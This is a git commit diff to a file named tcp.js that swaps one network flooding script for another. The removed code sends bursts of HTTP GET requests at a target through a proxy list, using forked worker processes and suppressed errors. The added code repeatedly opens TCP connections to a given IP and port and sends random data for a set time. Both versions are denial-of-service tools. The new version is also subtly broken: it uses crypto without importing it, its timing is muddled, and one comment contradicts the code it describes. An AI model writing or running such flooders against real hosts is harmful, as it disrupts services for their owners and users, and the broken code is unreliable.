43b4dcdbedeadc43dee29b6591eedf1cedcb09dd
httpplain <147990607+httpplain@users.noreply.github.com>
2023-12-25 11:49:15 +0700

    Update tcp.js

--- tcp.js
+++ tcp.js
@@ -1,35 +1,48 @@
-process.on('uncaughtException', function() {});
-process.on('unhandledRejection', function() {});
 const net = require('net');
-const fs = require('fs');
-const url = require('url');
-const cluster = require('cluster');
-var proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
-var tarPOST = "http://"+process.argv[2]+":"+process.argv[3];
-var parsed = url.parse(tarPOST);
-if (cluster.isMaster){
-    for (let i = 0; i<process.argv[5]; i++){
-        cluster.fork();
-    }
-setTimeout(() => {
-process.exit(1);
-}, process.argv[4] * 1000);
-}
-//const AllUA = fs.readFileSync("header.txt", 'utf-8').toString().replace(/\r/g, '').split('\n'); //读取UA
 
-setInterval(function() {
-    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
-    proxy = proxy.split(':');
-    var socket = net.connect(proxy[1], proxy[0]);
-    socket.setKeepAlive(false, 0);
-    socket.setTimeout(5000);
-    for (let j = 0; j < 128; j++) {
-    socket.write('GET ' + tarPOST +' HTTP/1.1\r\nHost: '+ parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + '\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-HK,zh;q=0.9,en;q=0.8,zh-CN;q=0.7,en-US;q=0.6\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n');
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+(async () => {
+  if (process.argv.length !== 5) {
+    console.log("Usage: node filename.js <IP> <port> <time>");
+    return;
+  }
+
+  const ip = process.argv[2];
+  const port = parseInt(process.argv[3]);
+  const time = parseInt(process.argv[4]);
+
+  const endTime = Date.now() + time;
+
+  while (Date.now() < endTime) {
+    try {
+      // Establish TCP connection
+      const client = new net.Socket();
+      await new Promise((resolve, reject) => {
+        client.connect(port, ip, resolve);
+        client.on('error', reject);
+      });
+
+      // Generate random data
+      const data = Buffer.alloc(1300);
+      crypto.randomFillSync(data);
+
+      // Send data
+      await new Promise((resolve, reject) => {
+        client.write(data, null, (err) => {
+          if (err) reject(err);
+          else resolve();
+        });
+      });
+
+      console.log("Data sent successfully!");
+      client.destroy();
+    } catch (err) {
+      console.log(`Failed to connect or send data: ${err}`);
     }
-	socket.on('data', function() {
-        setTimeout(function() {
-            socket.destroy();
-            return delete socket;
-        }, 5000);
-    })
-});
+
+    await sleep(1000); // Wait for 5 seconds before sending the next packet
+  }
+})();
